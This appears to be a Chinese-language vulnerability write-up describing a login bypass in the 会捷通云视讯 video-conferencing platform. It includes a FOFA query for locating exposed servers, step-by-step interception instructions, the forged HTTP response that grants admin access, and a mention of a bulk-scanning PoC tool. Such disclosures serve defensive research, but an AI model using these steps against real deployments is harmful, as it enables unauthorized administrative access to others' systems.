# 会捷通云视讯 登录绕过漏洞

## 漏洞描述

会捷通云视讯存在登录绕过漏洞，通过修改返回包内容即可实现获取后台权限


##  fofa语法

body="/him/api/rest/v1.0/node/role"

##  复现
登录界面如下
![image](https://github.com/abcdeeef/Edison_sec/assets/87749200/e9697efb-5f44-4c99-bc43-5f8133eb1b96)

输入任意的账号密码抓包
![image](https://github.com/abcdeeef/Edison_sec/assets/87749200/e2cd70d4-4e4b-49d5-a680-ebda3304b1f6)

选择"Response this request"并放包
![image](https://github.com/abcdeeef/Edison_sec/assets/87749200/64f3ee5a-e60a-46ca-b052-f8750a656c1c)

修改返回包为如下后放包则成功绕过登录

```plain
HTTP/1.1 200 
Server: Hsengine/1.4.1
Date: Mon, 17 May 2021 16:13:43 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Accept-Ranges: bytes
Vary: Accept-Charset, Accept-Encoding, Accept-Language, Accept
Content-Length: 61

{"token":null,"result":null}
```
![image](https://github.com/abcdeeef/Edison_sec/assets/87749200/bd43c912-5a28-4c66-b4e3-e1a8233531fd)

# poc
该poc可实现两个功能
  -u 查询单个url是否存在该漏洞
  -f 批量查询多个url是否存在该漏洞
  ![image](https://github.com/abcdeeef/Edison_sec/assets/87749200/68167d32-7c14-45ee-8139-b373ba259e84)
![image](https://github.com/abcdeeef/Edison_sec/assets/87749200/553d1be8-540b-40e5-9d3a-e1de61d24ec0)

